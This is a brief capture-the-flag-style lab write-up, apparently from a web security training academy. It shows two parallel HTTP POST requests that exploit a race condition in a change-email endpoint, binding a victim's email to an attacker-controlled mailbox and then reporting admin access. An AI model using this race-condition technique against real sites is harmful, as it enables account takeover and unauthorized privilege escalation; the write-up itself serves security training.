# Single Endpoint Race Condition

The website has a vulnerable change email function, and we know that the email address [`carlos@ginandjuice.shop`](mailto:carlos@ginandjuice.shop) has received the invitation for the admin access.

After a request to change an email address is sent, the confirmation letter is sent to the mailbox. However, with a race condition flaw, we can receive a confirmation link for another mail address on our mailbox. For that, we need to try sending 2 requests in parallel, one for our controlled email, other for victim’s email.

```bash
POST /my-account/change-email HTTP/2
Host: 0a9c00b804e5a3f6840003cc00fd00dc.web-security-academy.net
Cookie: session=QPsdHTgLWtsfk9X7zkceyQb3DwOKSFx7
Content-Length: 69
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a9c00b804e5a3f6840003cc00fd00dc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9c00b804e5a3f6840003cc00fd00dc.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

email=carlos%40ginandjuice.shop&csrf=hEXtTFRzMyOrOaevaTNYlrEsNylFN0D6
```

```bash
POST /my-account/change-email HTTP/2
Host: 0a9c00b804e5a3f6840003cc00fd00dc.web-security-academy.net
Cookie: session=QPsdHTgLWtsfk9X7zkceyQb3DwOKSFx7
Content-Length: 112
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a9c00b804e5a3f6840003cc00fd00dc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9c00b804e5a3f6840003cc00fd00dc.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

email=wiener%40exploit-0ab6009a04e0a332849602050140008b.exploit-server.net&csrf=hEXtTFRzMyOrOaevaTNYlrEsNylFN0D6
```

![image.png](Single%20Endpoint%20Race%20Condition/image.png)

Admin access is granted

![image.png](Single%20Endpoint%20Race%20Condition/image%201.png)